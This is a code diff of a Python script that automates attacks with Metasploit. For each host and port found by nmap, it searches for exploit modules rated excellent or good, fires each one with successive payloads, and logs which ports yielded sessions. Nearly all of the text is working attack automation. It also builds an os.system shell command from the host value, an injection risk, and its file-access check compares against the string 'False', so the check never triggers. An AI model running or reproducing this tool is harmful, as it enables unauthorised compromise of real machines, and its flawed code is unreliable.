@@ -78,25 +78,36 @@ f4 = open(startDir + "/cveDetails.txt","a+")
 
 # '/' is not platform independant and neither is 'cd' #
 def findModules(service, details, port, host):
-    print("testing port:" + str(port))
-    hostDir = 'cd ' + startDir[1:] + '/' + host
+    print("testing port:" + str(port) + " for host: " + host)
+    hostDir = host.replace(".","-")
+    fullPath = startDir + '/' + hostDir # where we want to be
+    # console.write('cd /')
+    fullPathCMD = 'cd ' + fullPath
     outFile = service + str(port) + '.csv'
-    console.write('cd ' + '/')
-    while console.read()['busy'] == "True":
-        time.sleep(1)
-    console.write(hostDir) # switch into host dir if not already
-    while console.read()['busy'] == "True":
-        time.sleep(1)
-    search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
-    try:
-        console.write(search)
-        while console.read()['busy'] == "True":
-            time.sleep(1)
-        return outFile
-    except:
-        print("  error with search")
-    return "error"
-
+    pwdCorrect = "False"
+    count = 0
+    while pwdCorrect == "False" and count < 5:
+        try:
+            console.write(fullPathCMD) # make sure we go to right directory first
+            while console.read()['busy'] == "True":
+                time.sleep(1)
+            pwdCorrect = "True"
+        except:
+            count += 1
+    if pwdCorrect == "False":
+        print("MSF could not get the directory right")
+        return "error"
+    else:
+		# what we want to search msfconsole for now that in right directory
+        search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
+        try:
+            console.write(search) # actually perform the search for modules and store the output
+            while console.read()['busy'] == "True":
+                time.sleep(1)
+            return outFile
+        except:
+            print("  error with search")
+            return "error"
 
 
 def exploitHost(host):
@@ -104,7 +115,8 @@ def exploitHost(host):
 	countMSMod = 0
 	exploitObjects = []
 	try:
-		os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + host)
+		hostDir = host.replace(".","-")
+		os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + hostDir)
 	except Exception as e:
 		print(e)
 	for port in nm[host]['tcp'].keys():
@@ -114,20 +126,19 @@ def exploitHost(host):
 		if exploitFile == "error":
 			print("  no file returned from called method")
 		else:
-			filePath = host + '/' + exploitFile
+			filePath = f"{startDir}/{hostDir}/{exploitFile}"
 			try:
+				while os.access(filePath, os.R_OK) == "False" or os.access(filePath, os.W_OK) == "False":
+					print("Cant be read/write yet waiting...")
+					time.sleep(1)
 				df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
-				time.sleep(2)
-				dfLen = len(df)
+				dfLen = len(df.index)
 			except Exception as e:
-				if 'does not exist' in str(e):
-					print("  Could not locate " + filePath + " in " + os.getcwd())
-					dfLen = 0
-				else:
-					print(e)
-					dfLen = 0 # Metasploit returned "No results found"
-			countMSMod = countMSMod + dfLen
+				print(e)
+				dfLen = 0
+
 			if dfLen > 0:
+				countMSMod = countMSMod + dfLen
 				for index, row in df.iterrows():
 					exploitName = row['Name'][8:]
 					print("  Attempting module: " + exploitName)
@@ -149,54 +160,51 @@ def exploitHost(host):
 								pass
 
 						for item in exploit2.missing_required:
-							print("  Item not set: " + item + ". Exiting exploit " + exploitName)
+							print("    Item not set: " + item + ". Exiting exploit " + exploitName)
+							break
 
-						sessionsBefore = len(client.sessions.list)
-						time.sleep(1)
-						failed = True
+						failedToRun = True
 						i = 0
-						while failed is True and i <= len(exploit2.targetpayloads())-1:
+						while failedToRun is True and i <= len(exploit2.targetpayloads())-1:
 							try:
 								payload = exploit2.targetpayloads()[i]
 								payloadObj = client.modules.use('payload', payload)
 								exploit2.execute(payload=payloadObj)
-								failed = False
+								failedToRun = False
 							except:
 								i += 1
-						time.sleep(5)
-
-						if len(client.sessions.list) > sessionsBefore:
-							print("     The exploit worked!")
-							result = 'Success'
-						else:
-							print("     The exploit failed")
-							result = 'Fail'
+								time.sleep(5)
+						result = 'Fail'
 
 						hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
 						exploitObjects.append(hostExploits)
 					else:
 						print("  No payload selected for: " + exploitName)
 			else:
+				print(filePath)
+				print(df)
 				print("  No modules found") # No modules found for this service / port
 
 
+	for index in client.sessions.list:
+		for item in exploitObjects:
+			if item["Port"] == str(client.sessions.list[index]['session_port']):
+				item['Result'] = 'Success'
+
 	try:
-		csv_file = host + '/exploits.csv'
+		outDir = host.replace(".","-")
+		csv_file = outDir + '/exploits.csv'
 		with open(csv_file, 'w') as csvfile:
 			writer = csv.DictWriter(csvfile, fieldnames = ["IP", "Service", "Port", "Exploit", "Payload", "Result"])
 			writer.writeheader()
 			for x in exploitObjects:
 				writer.writerow(x)
-		# exploitObject = dataframe.to_dict('records')
-		# dataframe.to_csv('exploits.csv')
+
 	except Exception as e:
 		print(e)
+
 	hostSessions = len(client.sessions.list)-hostSessions
 	return countMSMod, str(hostSessions)
-
-
-
-
 
 
 for host in nm.all_hosts():
